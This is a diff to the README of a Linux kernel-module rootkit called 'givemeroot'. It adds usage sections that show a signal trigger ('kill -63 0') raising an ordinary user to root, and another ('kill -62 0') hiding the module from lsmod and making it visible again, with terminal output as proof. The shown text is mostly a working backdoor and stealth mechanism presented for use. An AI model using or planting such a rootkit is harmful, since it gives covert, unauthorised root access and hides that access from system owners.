@@ -22,13 +22,24 @@ root@lkm:~/givemeroot# insmod givemeroot.ko
 ```
 
 # Usage
+
+## Grant root access
 ```bash
 nuvm@lkm:~$ id
 uid=1001(nuvm) gid=1001(nuvm) groups=1001(nuvm),100(users)
 nuvm@lkm:~$ kill -63 0
 nuvm@lkm:~$ id
 uid=0(root) gid=0(root) groups=0(root),100(users),1001(nuvm)
+```
 
+## Hide/ Unhide module
+```bash
+nuvm@lkm:~$ lsmod | grep givemeroot
+nuvm@lkm:~$ kill -62 0
+nuvm@lkm:~$ lsmod | grep givemeroot
+givemeroot             16384  0
+nuvm@lkm:~$ kill -62 0
+nuvm@lkm:~$ lsmod | grep givemeroot
 ```
 
 # Disclaimer
